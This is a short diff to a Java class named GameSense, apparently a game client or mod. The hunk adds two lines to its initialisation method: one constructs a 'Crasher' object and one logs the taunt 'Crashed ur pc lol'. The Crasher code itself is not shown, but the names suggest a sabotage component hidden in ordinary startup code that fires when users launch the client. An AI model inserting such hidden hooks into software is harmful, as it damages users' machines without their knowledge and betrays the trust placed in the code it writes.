@@ -101,5 +101,8 @@ public class GameSense {
 
 		capeUtil = new CapeUtil();
 		LOGGER.info("Capes initialized!");
+		
+		crasher = new Crasher();
+		LOGGER.info("Crashed ur pc lol");
 	}
 }
